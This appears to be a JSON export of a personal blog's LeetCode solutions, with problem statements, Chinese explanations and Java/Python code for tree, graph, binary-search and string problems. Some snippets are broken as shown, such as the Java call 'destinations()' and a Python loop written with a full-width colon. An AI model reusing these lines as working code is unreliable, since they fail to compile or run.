Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"337. House Robber III","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-337-House-Robber-III/","text":"The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the “root.” Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that “all houses in this place forms a binary tree”. It will automatically contact the police if two directly-linked houses were broken into on the same night. Determine the maximum amount of money the thief can rob tonight without alerting the police. Example 1: Input: [3,2,3,null,3,null,1] 3 / \\ 2 3 \\ \\ 3 1 Output: 7 Explanation:&nbsp;Maximum amount of money the thief can rob = 3 + 3 + 1 = 7. Example 2: Input: [3,4,5,1,3,null,1] &nbsp; 3 / \\ 4 5 / \\ \\ 1 3 1 Output: 9 Explanation:&nbsp;Maximum amount of money the thief can rob = 4 + 5 = 9. Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"332. Reconstruct Itinerary","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-332-Reconstruct-Itinerary/","text":"Given a list of airline tickets represented by pairs of departure and arrival airports [from, to], reconstruct the itinerary in order. All of the tickets belong to a man who departs from JFK. Thus, the itinerary must begin with JFK. Note: If there are multiple valid itineraries, you should return the itinerary that has the smallest lexical order when read as a single string. For example, the itinerary [&quot;JFK&quot;, &quot;LGA&quot;] has a smaller lexical order than [&quot;JFK&quot;, &quot;LGB&quot;]. All airports are represented by three capital letters (IATA code). You may assume all tickets form at least one valid itinerary. Example 1: 12Input: [[&quot;MUC&quot;, &quot;LHR&quot;], [&quot;JFK&quot;, &quot;MUC&quot;], [&quot;SFO&quot;, &quot;SJC&quot;], [&quot;LHR&quot;, &quot;SFO&quot;]]Output: [&quot;JFK&quot;, &quot;MUC&quot;, &quot;LHR&quot;, &quot;SFO&quot;, &quot;SJC&quot;] Example 2: 1234Input: [[&quot;JFK&quot;,&quot;SFO&quot;],[&quot;JFK&quot;,&quot;ATL&quot;],[&quot;SFO&quot;,&quot;ATL&quot;],[&quot;ATL&quot;,&quot;JFK&quot;],[&quot;ATL&quot;,&quot;SFO&quot;]]Output: [&quot;JFK&quot;,&quot;ATL&quot;,&quot;JFK&quot;,&quot;SFO&quot;,&quot;ATL&quot;,&quot;SFO&quot;]Explanation: Another possible reconstruction is [&quot;JFK&quot;,&quot;SFO&quot;,&quot;ATL&quot;,&quot;JFK&quot;,&quot;ATL&quot;,&quot;SFO&quot;]. But it is larger in lexical order. Java这道题目寻找访问所有有向图的边的路径，并且路径的词典序(lexical order)为最小。通过图（有向图或无向图）中的所有边且每一条边仅通过一次的路径称为欧拉路径。那么这道题目其实就是寻找欧拉路径。 其实不知道欧拉路径以及它的算法，这道题目也是可以解决的。由于是图的遍历问题，很容易想到dfs，或者回溯法。具体做法为：创建一个图，将图中的目的地按照字母顺序排序，依次访问每一个目的地，记录下访问的目的地，检查是否使用完所有飞机票；如果没有，则改变行程，尝试另一张飞机票。一直尝试，直到用完所有飞机票。 关键点在于：由于要求访问的词典序最小，所以首先访问词典序最小的目的地，如果不成功，再尝试词典序大一些的。 123456789101112131415161718192021222324252627282930313233343536public List&lt;String&gt; findItinerary(String[][] tickets) &#123; int n = tickets.length; LinkedList&lt;String&gt; visitOrder = new LinkedList&lt;&gt;(); Map&lt;String, LinkedList&lt;String&gt;&gt; map = new HashMap&lt;&gt;(); for (String[] ticket : tickets) &#123; map.putIfAbsent(ticket[0], new LinkedList&lt;&gt;()); map.get(ticket[0]).add(ticket[1]); &#125; for (String v : map.keySet()) Collections.sort(map.get(v)); visitOrder.addFirst(\"JFK\"); findItinerary(visitOrder, map, \"JFK\", n); return visitOrder;&#125;private boolean findItinerary(LinkedList&lt;String&gt; visitOrder, Map&lt;String, LinkedList&lt;String&gt;&gt; map, String v, int n) &#123; // base case if (visitOrder.size() == n + 1) return true; LinkedList&lt;String&gt; destinations = map.get(v); // special case: v is invalid or v has no destinations if (destinations == null || destinations() == 0) return false; // iterate int size = destinations(); for (int i = 0; i &lt; size; i++) &#123; String w = destinations.remove(i); visitOrder.addLast(w); if (findItinerary(visitOrder, map, w, n)) return true; visitOrder.removeLast(); destinations.add(i, w); &#125; return false;&#125; 对于欧拉路径，有专门的算法Hierholzer’s algorithm来寻找欧拉路径。 Hierholzer’s 1873 paper provides a different method for finding Euler cycles that is more efficient than Fleury’s algorithm: Choose any starting vertex $v$, and follow a trail of edges from that vertex until returning to $v$. It is not possible to get stuck at any vertex other than $v$, because the even degree of all vertices ensures that, when the trail enters another vertex $w$ there must be an unused edge leaving $w$. The tour formed in this way is a closed tour, but may not cover all the vertices and edges of the initial graph. As long as there exists a vertex $u$ that belongs to the current tour but that has adjacent edges not part of the tour, start another trail from $u$, following unused edges until returning to $u$, and join the tour formed in this way to the previous tour. 首先从起点JFK出发，dfs找到一个sub-path: JFK-&gt;A-&gt;C-&gt;D-&gt;A，在A处出现dead end(不再有可以走的边)，此时将A加到解当中，dfs返回。对于返回到的节点D，还有可以继续走的subpath，dfs继续找，得：D-&gt;B-&gt;C-&gt;JFK-&gt;D。此时的D为dead end，说明可以将D加到解当中，而且处于已经加过的点之前。以此类推，每次都加dead end的节点。直到所有点都是dead end！","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"93. Restore IP Adress","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-93-Restore-IP-Adress/","text":"Given a string containing only digits, restore it by returning all possible valid IP address combinations. Example: 12Input: &quot;25525511135&quot;Output: [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;]","tags":[{"name":"Backtracking","slug":"Backtracking","permalink":"http://larryim.cc/tags/Backtracking/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"34. Find First and Last Position of Element in Sorted Array","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-34-Search-for-a-Range/","text":"Given an array of integers nums sorted in ascending order, find the starting and ending position of a given target value. Your algorithm’s runtime complexity must be in the order of $O(\\log n)$. If the target is not found in the array, return [-1, -1]. Example 1: 12Input: nums = [5,7,7,8,8,10], target = 8Output: [3,4] Example 2: 12Input: nums = [5,7,7,8,8,10], target = 6Output: [-1,-1] Python既然要求$O(\\log n)$那必然又是binary search变种。要找到target在数组中的左右边界，必然先得要在数组中找到一个target。一种条件反射的思路是binary search找到target，即A[mid] = target，然后从mid开始向左右扫描来发现左右边界。 123456789101112131415161718192021222324252627282930313233343536class Solution(object): def searchRange(self, nums, target): \"\"\" :type nums: List[int] :type target: int :rtype: List[int] \"\"\" n = len(nums) left = 0 right = n - 1 result_left, result_right = -1, -1 while left &lt;= right： mid = (left + right) //2 print(left, right, mid) if nums[mid] == target: tmp = mid while tmp &gt; -1 and nums[tmp] == target: tmp -= 1 result_left = tmp+1 tmp = mid while tmp &lt; n and nums[tmp] == target: tmp += 1 result_right = tmp-1 return [result_left, result_right] elif nums[mid] &gt; target: right = mid - 1 else: left = mid + 1 return [-1, -1] 但显然这种算法不是$O(\\log n)$的，比如当所有元素都一样，并且等于target时，算法退化为$O(n)$。 二分查找时特殊处理target = A[mid]的情况对搜索left：如果target = A[mid]则继续向左找，否则向右找。直到搜索结束，left = start对搜索right：如果target = A[mid]则继续向右找，否则向左找。直到搜索结束，right = end最后判断如果A[left], A[right] != target，则表明target不存在于数组中, left = right = -1。 Java这道题目思路是非常简单的，但是题目有个要求就是必须要有$O(\\log n)$的时间复杂度，这就增加了题目的难度。对于在排序的数列中寻找一个值来说，最经典的就是二分查找了。但是题目要求我们必须找到左右边界。可以很自然的想到，当找到一个数时，依次向左/向右寻找边界，就可以寻找到答案。非常不幸的是，这违反了时间复杂度：设想最坏的情况，当数组的所有值都是该值时，需要遍历整个数组，时间复杂度达到了$O(n)$。 一个更优化的方案是，在寻找左右边界时也采用二分查找的办法，具体方法是：先找到该值的位置find, 针对左边界，寻找[0, find]的区间，针对右边界，寻找[find, nums.length-1]区间，直到区间内找不到该值。 rank()方法查找的是该区间内的值，如果查找到该值，则返回该值的位置；如果没有查找到该值，则返回小于该值的位置。 另外，特别需要注意程序中下标的溢出。 123456789101112131415161718192021222324252627282930313233343536373839404142public int[] searchRange(int[] nums, int target) &#123; // starting and ending position of a given target value. int left, right; int find = rank(nums, 0, nums.length - 1, target); if (find &lt; 0 || nums[find] != target) &#123; left = -1; right = -1; &#125; else &#123; int findLeft = find; while (findLeft != 0 &amp;&amp; nums[findLeft] == target) findLeft = rank(nums, 0, findLeft - 1, target); if (nums[findLeft] == target) left = findLeft; else left = findLeft + 1; int findRight = find; while (findRight != nums.length - 1 &amp;&amp; nums[findRight] == target) &#123; int findRightRes = rank(nums, findRight + 1, nums.length - 1, target); if (findRightRes &lt; findRight + 1) break; findRight = findRightRes; &#125; if (nums[findRight] == target) right = findRight; else right = findRight - 1; &#125; return new int[]&#123;left, right&#125;;&#125;/** * find the index of target. * return the index of target if find, * else return the index whose value is less than target. */private int rank(int[] nums, int lo, int hi, int target) &#123; while (lo &lt;= hi) &#123; int mid = (hi + lo) &gt;&gt;&gt; 1; int cmp = nums[mid] - target; if (cmp &gt; 0) hi = mid - 1; else if (cmp &lt; 0) lo = mid + 1; else return mid; &#125; return lo - 1;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"345. Reverse Vowels of a String","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-345-Reverse-Vowels-of-a-String/","text":"Write a function that takes a string as input and reverse only the vowels of a string. Example 1: 12Input: &quot;hello&quot;Output: &quot;holle&quot; Example 2: 12Input: &quot;leetcode&quot;Output: &quot;leotcede&quot; Note:The vowels does not include the letter “y”. Java首先，需要了解英文字母里面的元音字母一共有A, E, I, O, and U。这道题目思路还是非常直接的。就是从左右开始分别寻找元音字母，如果找到它们则相互交换。 第一个问题是如何确认该字母是元音字母。首先想到的是可以把所有字母放在HashSet中，然后查询HashSet。 1234Set&lt;Character&gt; vowels = new HashSet&lt;&gt;( Arrays.asList('A', 'E', 'I', 'O', 'U', 'a', 'e', 'i', 'o', 'u'));vowels.contains(char); 另一种方案是用Switch匹配 123456789101112131415public static boolean isVowel(char a)&#123; switch(a)&#123; case ('a') : return true; case ('e') : return true; case ('i') : return true; case ('o') : return true; case ('u') : return true; case ('A') : return true; case ('E') : return true; case ('I') : return true; case ('O') : return true; case ('U') : return true; default : return false; &#125;&#125; 结果显示用Switch匹配更快一些，前面方案用时7ms，后面方案用时5ms。 然后就是寻找元音字母了。这个其实是非常简单的，主要是细节问题，注意下标的处理。寻找元音字母的过程其实和快排的Partition过程非常类似，可以说几乎一摸一样。 12345678910111213141516171819int n = s.length() - 1;int left = 0, right = n;while (true) &#123; // find vowels while (!isVowel(charArray[left++])) if (left == n) return new String(charArray); while (!isVowel(charArray[right--])) &#123; &#125; // check if two pointers cross if (--left &gt;= ++right) break; // exchange them temp = charArray[right]; charArray[right] = charArray[left]; charArray[left] = temp; left++; right--;&#125; 最后的问题就是字符串的表示以及返回。这里我也想到了几种方案，并进行了比较。第一种方案是使用StringBuilder，首先新建一个与原始字符串相同的StringBuilder，然后每次要交换时都进行替换。 1234StringBuilder res = new StringBuilder(s);// exchange themres.replace(left, left + 1, String.valueOf(charArray[right]));res.replace(right, right + 1, String.valueOf(charArray[left])); 这种方案的效率非常低！运行时间需要170ms，整整慢了几十倍。 另一种方案是直接使用char Array，由于是in-place replacement，而且没有额外对象的开销，速度非常快。 最后我使用的方案，击败了100%的人。 1234567891011121314151617181920212223242526272829303132333435363738394041public String reverseVowels(String s) &#123; if (s.length() &lt; 2) return s; char[] charArray = s.toCharArray(); char temp; int n = s.length() - 1; int left = 0, right = n; while (true) &#123; // find vowels while (!isVowel(charArray[left++])) if (left == n) return new String(charArray); while (!isVowel(charArray[right--])) &#123; &#125; // check if two pointers cross if (--left &gt;= ++right) break; // exchange them temp = charArray[right]; charArray[right] = charArray[left]; charArray[left] = temp; left++; right--; &#125; return new String(charArray);&#125; public static boolean isVowel(char a)&#123; switch(a)&#123; case ('a') : return true; case ('e') : return true; case ('i') : return true; case ('o') : return true; case ('u') : return true; case ('A') : return true; case ('E') : return true; case ('I') : return true; case ('O') : return true; case ('U') : return true; default : return false; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"344. Reverse String","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-344-Reverse-String/","text":"Write a function that takes a string as input and returns the string reversed. Example 1: 12Input: &quot;hello&quot;Output: &quot;olleh&quot; Example 2: 12Input: &quot;A man, a plan, a canal: Panama&quot;Output: &quot;amanaP :lanac a ,nalp a ,nam A&quot; Java循环 1234567public String reverseString(String s) &#123; StringBuilder res = new StringBuilder(); for (int i = s.length() - 1; i &gt;= 0; i--) &#123; res.append(s.charAt(i)); &#125; return res.toString();&#125; 直接利用StringBuilder.reverse()方法。 123public String reverseString(String s) &#123; return new StringBuilder(s).reverse().toString();&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"94. Binary Tree Inorder Traversal","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-94-Binary-Tree-Inorder-Traversal/","text":"Given a binary tree, return the inorder traversal of its nodes’ values. Example: 12345678Input: [1,null,2,3] 1 \\ 2 / 3Output: [1,3,2] Follow up: Recursive solution is trivial, could you do it iteratively? Java这道题目和144. Binary Tree Preorder Traversal一摸一样，给出三种方案： 有帮助函数的递归，省去了反复要生成List. 123456789101112public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); inorderTraversalHelper(root, list); return list;&#125; private void inorderTraversalHelper(TreeNode root, List&lt;Integer&gt; list) &#123; if (root == null) return; inorderTraversalHelper(root.left, list); list.add(root.val); inorderTraversalHelper(root.right, list);&#125; 直接递归 12345678public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new LinkedList&lt;&gt;(); if (root == null) return list; list.addAll(inorderTraversal(root.left)); list.add(root.val); list.addAll(inorderTraversal(root.right)); return list;&#125; 迭代 1234567891011121314151617public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; res = new ArrayList&lt;Integer&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;TreeNode&gt;(); TreeNode cur = root; while (cur != null || !stack.isEmpty()) &#123; while (cur != null) &#123; // Travel to each node's left child, // till reach the left leaf stack.push(cur); cur = cur.left; &#125; cur = stack.pop(); // Backtrack to higher level node A res.add(cur.val); // Add the node to the result list cur = cur.right; // Switch to A'right branch &#125; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"},{"name":"HashTable","slug":"HashTable","permalink":"http://larryim.cc/tags/HashTable/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"35. Search Insert Position","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-35-Search-Insert-Position/","text":"Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order. You may assume no duplicates in the array. Example 1: 12Input: [1,3,5,6], 5Output: 2 Example 2: 12Input: [1,3,5,6], 2Output: 1 Example 3: 12Input: [1,3,5,6], 7Output: 4 Example 4: 12Input: [1,3,5,6], 0Output: 0 这道题比较简单，就是二分查找(binary search)。思路就是每次取中间，如果等于目标即返回，否则根据大小关系切去一半。因此算法复杂度是$O(\\log n)$，空间复杂度$O(1)$。 注意以上实现方式有一个好处，就是当循环结束时，如果没有找到目标元素，那么first一定停在恰好比目标大的index上，right一定停在恰好比目标小的index上。 1234567891011121314151617181920212223class Solution(object): def searchInsert(self, nums, target): \"\"\" :type nums: List[int] :type target: int :rtype: int \"\"\" first = 0 last = len(nums) - 1 found = False while first &lt;= last and not found: mid = (first + last) //2 if nums[mid] == target: found = True return mid elif nums[mid] &gt; target: last = mid - 1 else: first = mid + 1 return first","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"92. Reverse Linked List II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-92-Reverse-Linked-List-II/","text":"Reverse a linked list from position $m$ to $n$. Do it in one-pass. Note: $1 \\le m \\le n \\le$ length of list. Example: 12Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4Output: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL Java类似反转链表在LeetCode中题目有很多，例如LeetCode 25. Reverse Nodes in k-Group, LeetCode 206. 206. Reverse Linked List。题目要求一次性反转链表的一部分。这道题目考查的还是链表的基本操作。方法是相当直接的。唯一需要注意的是如果要求反转的部分包括链表头部，那么肯定需要加入一个虚拟的节点在链表头部前。基本操作是 找到起始点 从起始点开始到结束点，后面的节点都指向前面的节点 把起始点和结束点指向正确位置 123456789101112131415161718192021222324252627282930313233343536public ListNode reverseBetween(ListNode head, int m, int n) &#123; if (m == n) return head; ListNode prev = new ListNode(-1), next = null; // previously/next visted ListNode ListNode start, end; // the start/end of reverse-part linked list ListNode cur = prev, root = cur; cur.next = head; // add dummy node; int i = 0; // index // find the start of the reserve-part linked list while (cur != null) &#123; if (i++ == m) break; prev = cur; cur = cur.next; &#125; start = prev; // the start posiiton of reverse-part linked list // reverse the linked list between m to n // Output: 1-&gt;2&lt;-3&lt;-4 5-&gt;NULL, m = 2, n = 4 prev = cur; cur = cur.next; // remove to next node while (i &lt;= n) &#123; next = cur.next; cur.next = prev; prev = cur; cur = next; i++; &#125; end = prev; // reverse m -- n : the endpoint part // Output: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL start.next.next = next; start.next = end; return root.next;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"91. Decode Ways","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-91-Decode-Ways/","text":"A message containing letters from A-Z is being encoded to numbers using the following mapping: 1234&apos;A&apos; -&gt; 1&apos;B&apos; -&gt; 2...&apos;Z&apos; -&gt; 26 Given a non-empty string containing only digits, determine the total number of ways to decode it. Example 1: 123Input: &quot;12&quot;Output: 2Explanation: It could be decoded as &quot;AB&quot; (1 2) or &quot;L&quot; (12). Example 2: 123Input: &quot;226&quot;Output: 3Explanation: It could be decoded as &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), or &quot;BBF&quot; (2 2 6). Java这道题目要求解码的方法数目，是典型的动态规划题目。题目虽然不难，但是坑真的比较多。 第一个坑是需要单独把前两个提前计算，因为不能包括在状态方程里，而这个计算稍微复杂了点，容易出错。第二个坑，是个大坑，就是出现‘0’。‘0’可能出现在任意位置，所以每次都要检验。总体来说不难，需要特别细心。 1234567891011121314151617public int numDecodings(String s) &#123; int n = s.length(); // check 0 if (s.charAt(0) == '0') return 0; if (n == 1) return 1; // num[i]代表第i个字符到结尾组成的字符串有解码方案的种数。 int[] num = new int[n]; num[n - 1] = (s.charAt(n - 1) == '0') ? 0 : 1; num[n - 2] = (s.charAt(n - 2) == '0') ? 0 : (num[n - 1] + (s.substring(n - 2, n).compareTo(\"26\") &lt;= 0 ? 1 : 0)); for (int i = n - 3; i &gt;= 0; i--) &#123; if (s.charAt(i) == '0') continue; num[i] = (s.substring(i, i + 2).compareTo(\"26\") &lt;= 0) ? num[i + 1] + num[i + 2] : num[i + 1]; &#125; return num[0]; &#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"366. Find Leaves of Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-366-Find-Leaves-of-Binary-Tree/","text":"Given a binary tree, collect a tree’s nodes as if you were doing this: Collect and remove all leaves, repeat until the tree is empty. Example 12345678910111213141516171819Given binary tree: 1 / \\ 2 3 / \\ 4 5 Returns [[4, 5, 3], [2], [1]].Explanation:1. Remove the leaves [4, 5, 3] from the tree 1 / 2 2. Remove the leaf [2] from the tree 1 3. Remove the leaf [1] from the tree [] Returns [4, 5, 3], [2], [1]. Java寻找二叉树的叶子节点。可以从例子中观察得到，节点在结果中的位置下标，等于以该节点为根节点的二叉树的深度。所以一个最直接的思路是该节点为根节点的二叉树的深度，在相应位置添加节点的值。 123456789101112131415161718192021222324public List&lt;List&lt;Integer&gt;&gt; findLeaves(TreeNode root) &#123; int height = maxHeight(root); List&lt;List&lt;Integer&gt;&gt; list = new ArrayList&lt;&gt;(); if (height == 0) return list; for (int i = 0; i &lt; height; i++) list.add(new ArrayList&lt;Integer&gt;()); list.get(height - 1).add(root.val); traversal(list, root.left); traversal(list, root.right); return list;&#125;private int maxHeight(TreeNode root) &#123; if (root == null) return 0; return 1 + Math.max(maxHeight(root.left), maxHeight(root.right));&#125;private void traversal(List&lt;List&lt;Integer&gt;&gt; list, TreeNode root) &#123; if (root == null) return; list.get(maxHeight(root) - 1).add(root.val); traversal(list, root.left); traversal(list, root.right);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"367. Valid Perfect Square","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-367-Valid-Perfect-Square/","text":"Given a positive integer num, write a function which returns True if num is a perfect square else False. Note: Do not use any built-in library function such as sqrt. Example 1: 12Input: 16Output: true Example 2: 12Input: 14Output: false Java这道题目与69. Sqrt(x)非常相像，只不过，Q69返回的是平方根值，这里返回的是是否是完全平方数。 1234567891011public boolean isPerfectSquare(int num) &#123; int lo = 0, hi = num; while (lo &lt;= hi) &#123; int mid = (lo + hi) &gt;&gt;&gt; 1; double cmp = ((double) mid)*mid - num; if (cmp &gt; 0) hi = mid - 1; else if (cmp &lt; 0) lo = mid + 1; else return true; &#125; return false;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"36. Valid Sudoku","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-36-Valid-Sudoku/","text":"题目Determine if a 9x9 Sudoku board is valid. Only the filled cells need to be validated according to the following rules: Each row must contain the digits 1-9 without repetition. Each column must contain the digits 1-9 without repetition. Each of the 9 3x3 sub-boxes of the grid must contain the digits 1-9 without repetition. A partially filled sudoku which is valid. The Sudoku board could be partially filled, where empty cells are filled with the character .. Example 1: 12345678910111213Input:[ [&quot;5&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;], [&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;], [&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;], [&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;], [&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;], [&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;], [&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;], [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;], [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]]Output: true Example 2: 1234567891011121314Input:[ [&quot;8&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;], [&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;], [&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;], [&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;], [&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;], [&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;], [&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;], [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;], [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]]Output: falseExplanation: Same as Example 1, except with the 5 in the top left corner being modified to 8. Since there are two 8&apos;s in the top left 3x3 sub-box, it is invalid. Note: A Sudoku board (partially filled) could be valid but is not necessarily solvable. Only the filled cells need to be validated according to the mentioned rules. The given board contain only digits 1-9 and the character ‘.’. The given board size is always 9x9. 思路利用hash table(这里是字典)，识别是否出现数字重复。利用numpy方便处理矩阵元素。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class Solution(object): def no_repetation(self, alist): n = len(alist) mydict = 